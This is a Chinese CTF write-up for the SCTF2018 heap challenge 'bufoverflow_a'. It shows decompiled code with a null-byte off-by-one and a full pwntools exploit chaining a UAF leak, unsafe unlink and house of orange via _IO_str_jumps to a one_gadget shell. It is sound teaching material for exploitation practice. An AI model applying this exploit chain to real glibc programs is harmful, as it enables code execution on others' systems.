# SCTF2018 bufoverflow_a

## Author: Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这道题是我认为综合性比较强的一题，而且用到了glibc2.24的house of orange，而不是常规的2.23，所以往常的伪造vtable的技巧在这里不能用，但是出入不大，我们可以把vtable伪造在\_IO_str_jumps上，虽然我没有安装有glibc2.24的机子可以验证poc是否能getshell，但2.24的poc是可以用来打2.23的，所以我在本地写了个demo放在how2pwn里验证已经通过了，所以基本没有什么问题（如果有大佬告诉我怎么装个glibc2.24切换用那就好了嘿嘿嘿）。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>同样的，我们首先从IDA的伪代码开始看起：</font></br>

**main**

```C
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  init_bufs();
  while ( 1 )
  {
    menu();                                     // int sub_F80()
                                                // {
                                                //   putchar(10);
                                                //   puts("1. Alloc");
                                                //   puts("2. Delete");
                                                //   puts("3. Fill");
                                                //   puts("4. Show");
                                                //   puts("5. Exit");
                                                //   return printf(">> ");
                                                // }
    _isoc99_scanf(&unk_1418, &v3);
    switch ( choose )
    {
      case 1u:
        add();
        break;
      case 2u:
        dele();
        break;
      case 3u:
        edit();
        break;
      case 4u:
        show();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```

**add**

```C
int add()
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  void *chunk; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; link[2 * i + 1]; ++i )
    ;
  if ( i > 0xF )
    return puts("No more space.");
  printf("Size: ");
  size = sub_F2E();
  if ( size <= 0x7F || size > 0x1000 )
    return puts("Invalid size!");
  if ( chunk_count > 1u )
  {
    mallopt(-6, 0xCC);
    chunk = calloc(1uLL, size);
  }
  else
  {
    mallopt(-6, 0);
    chunk = malloc(size);
  }
  if ( !chunk )
  {
    perror("Allocate faild!");
    exit(-1);
  }
  link[2 * i + 1] = chunk;
  link[2 * i] = size;
  cur_chunk[1] = chunk;
  *cur_chunk = size;
  ++chunk_count;
  return printf("chunk at [%d]\n", i);
}
```

**delete**

```C
int dele()
{
  void *v0; // rax
  unsigned int index; // [rsp+Ch] [rbp-4h]

  printf("Index: ");
  index = sub_F2E();
  if ( index <= 0xF && link[2 * index + 1] )
  {
    free(link[2 * index + 1]);
    cur_chunk[1] = 0LL;
    link[2 * index + 1] = 0LL;
    link[2 * index] = 0LL;
    v0 = &chunk_count;
    --chunk_count;
  }
  else
  {
    LODWORD(v0) = puts("Invalid index.");
  }
  return v0;
}
```

**edit**

```C
unsigned __int64 edit()
{
  unsigned __int64 chunk; // rax
  unsigned __int64 *v1; // [rsp+8h] [rbp-8h]

  v1 = cur_chunk;
  chunk = cur_chunk[1];
  if ( chunk )
  {
    printf("Content: ");
    chunk = null_byte_off_by_one(v1[1], *v1);
  }
  return chunk;
}
```

**show**

```C
unsigned __int64 show()
{
  unsigned __int64 chunk; // rax

  chunk = cur_chunk[1];
  if ( chunk )
    chunk = output(cur_chunk[1], *cur_chunk);
  return chunk;
}
```

**null_byte_off_by_one**

```C
unsigned __int64 __fastcall null_byte_off_by_one(__int64 chunk, unsigned __int64 size)
{
  char buf; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < size; ++i )
  {
    if ( read(0, &buf, 1uLL) <= 0 )
    {
      perror("Read faild!\n");
      exit(-1);
    }
    if ( buf == 10 )
      break;
    *(chunk + i) = buf;
  }
  *(i + chunk) = 0;                             // null byte off by one
  return __readfsqword(0x28u) ^ v5;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>程序可以用UAF轻易的泄漏出libc地址，但是chunk地址还是要费一些功夫的，但也不难，因为堆数量不大于2个的时候都是用malloc分配的，所以再次分配的时候有残留数据可以leak。因此我们首先分配一个largebin和若干其他堆，然后释放这个largebin和另一个堆块，这样我们有了两个unsortedbin，然后根据unsortedbin FIFO的原则，我们分配较小的那个链表末尾的堆块，然后第一个largebin堆块会被放入largebin list，然后因此这个largebin的fd_nextsize和bk_nextsize会被赋值，因此可以泄漏了（释放所有堆块，计算好fd的位置分配两个堆块，show第二个就可以leak了，如果还是不懂可以看我的how2pwn里的calloc_leak.c）。</font></br>

```python
from pwn import *

p=process('./bufoverflow_a',env={'LD_PRELOAD':'./libc.so.6'})
elf=ELF('./libc.so.6')

_IO_list_all=elf.symbols['_IO_list_all']
_IO_file_jumps=elf.symbols['_IO_file_jumps']
#one_gadget=0x3f4d6
one_gadget=0x3f52a
#one_gadget=0xd6655


context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='>> '

def add(size):
    sla(menu,'1')
    sla('Size: ',str(size))

def dele(index):
    sla(menu,'2')
    sla('Index: ',str(index))

def edit(content):
    sla(menu,'3')
    sla('Content: ',content)

def show():
    sla(menu,'4')


#leak libc base
add(0x100)      # 0
add(0x100)      # 1

dele(0)
dele(1)

add(0x100)      # 0
show()
libc_base=u64(p.recv(6)+2*'\x00')-0x399b58
log.info('libc base is:'+hex(libc_base))

dele(0)

# clear heap
##############################
# leak chunk base

add(0x100)      # 0
add(0x1000)     # 1
add(0x100)      # 2
add(0x100)      # 3
add(0x100)      # 4

dele(1)
dele(3)

# unsortedbin to largebin
add(0x100)      # 1

dele(4)
dele(1)
dele(2)
dele(0)

add(0x110)      # 0
add(0x100)      # 1
show()
chunk_base=u64(p.recv(6)+2*'\x00')-0x130
log.info('chunk base is:'+hex(chunk_base))

dele(0)
dele(1)

# clear heap
#################################

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来我们就要想着怎么攻破这个程序了，一般house of orange这类利用不是存在明显的堆溢出就是利用重叠堆块来编辑unsortedbin从而达到攻击的效果。堆溢出就是null-byte-off-by-one了，只有一个字节，那看来就是创造重叠堆块了。在这里我用了unsafe_unlink来伪造堆块（不懂或者忘了的话可以看我的how2pwn里的offbyone_unlink.c），这样可以在一个堆块内部分配其他堆块：</font></br>

```python
add(0x118)      # 0
add(0xf8)       # 1
add(0x108)      # 2

dele(0)
add(0x118)      # 0

fake_p=chunk_base+0x40
payload=p64(fake_p)+p64(0)*2+p64(0x101)
payload+=p64(fake_p-0x10-0x18)+p64(fake_p-0x10-0x10)
payload=payload.ljust(0x110,'\x00')
payload+=p64(0x100)
edit(payload)

dele(1)

# alloc it, and we got chunks overlapped
add(0x1f8)      # 1

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>既然有了重叠堆块，再搞一个重叠unsortedbin岂不容易，但这里有一个trick就是free的时候注意伪造一下前后堆块，随便在堆块末尾伪造一个fastbin或者pre_inuse置位的chunk，在这里我直接填充堆块为0x91就完事了。然后free掉末尾的堆块，这样我们就得到了两个没有被top chunk合并的unsortedbin，并且chunk_count=0，因此我们分配了低地址的chunk后对之进行编辑就可以随意修改unsortedbin了，所以这题的思路就这样。对了glibc2.24的话伪造vtable不行了，就把它放在\_IO_str_jumps处，然后根据偏移写好one_gadget就行了，其实跟glibc2.23差了不是特别多，嫌麻烦的学完了之后2.23，2.24的都用这个方法也行（没有2.24libc的，用how2pwn里的unlink2shell.c可以验证绕过vtable是可行的）。</font></br>

```python
add(0x1f8)      # 1
edit(p64(0x91)*0x38)
dele(0)
dele(2)

add(0x118)      # 0
edit(p64(0x91)*0x20)
dele(0)
dele(1)
# we got 2 unsorted bins

# alloc first one
# then rewrite the next unsorted bin, finish the attack!
add(0x118)
payload=p64(0)*3+p64(0x61)
payload+=p64(0)+p64(_IO_list_all+libc_base)
payload+=p64(0)+p64(1)
payload+=p64(0)*21+p64(_IO_file_jumps+libc_base+0xc0)
payload+=p64(one_gadget+libc_base)
edit(payload)
#gdb.attach(p,gdbscript='finish\nfinish\nfinish\nfinish\nfinish')

add(0x100)


p.interactive()


'''
0x3f4d6	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f52a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6655	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

```



